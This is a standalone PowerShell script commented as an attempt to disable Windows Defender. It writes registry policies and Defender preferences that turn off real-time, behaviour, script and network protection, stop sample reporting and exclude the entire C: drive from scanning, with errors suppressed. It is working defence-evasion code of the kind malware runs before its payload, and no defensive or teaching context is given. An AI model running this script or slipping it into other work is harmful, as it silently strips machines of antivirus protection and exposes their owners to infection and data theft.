# Attempt to disable Windows Defender
try {
    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft' -Name "Windows Defender" -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    Add-MpPreference -ExclusionPath "C:\" -Force -ea 0 | Out-Null
    Set-MpPreference -DisableArchiveScanning $true  -ea 0 | Out-Null
    Set-MpPreference -DisableBehaviorMonitoring $true -Force -ea 0 | Out-Null
    Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ea 0 | Out-Null
    Set-MpPreference -DisableCatchupFullScan $true -Force -ea 0 | Out-Null
    Set-MpPreference -DisableCatchupQuickScan $true -Force -ea 0 | Out-Null
    Set-MpPreference -DisableIntrusionPreventionSystem $true  -Force -ea 0 | Out-Null
    Set-MpPreference -DisableIOAVProtection $true -Force -ea 0 | Out-Null
    Set-MpPreference -DisableRealtimeMonitoring $true -Force -ea 0 | Out-Null
    Set-MpPreference -DisableRemovableDriveScanning $true -Force -ea 0 | Out-Null
    Set-MpPreference -DisableRestorePoint $true -Force -ea 0 | Out-Null
    Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -Force -ea 0 | Out-Null
    Set-MpPreference -DisableScanningNetworkFiles $true -Force -ea 0 | Out-Null
    Set-MpPreference -DisableScriptScanning $true -Force -ea 0 | Out-Null
    Set-MpPreference -EnableControlledFolderAccess Disabled -Force -ea 0 | Out-Null
    Set-MpPreference -EnableNetworkProtection AuditMode -Force -ea 0 | Out-Null
    Set-MpPreference -MAPSReporting Disabled -Force -ea 0 | Out-Null
    Set-MpPreference -SubmitSamplesConsent NeverSend -Force -ea 0 | Out-Null
    Set-MpPreference -PUAProtection Disabled -Force -ea 0 | Out-Null
}
catch {
    Write-Warning "Failed to disable Windows Defender"
}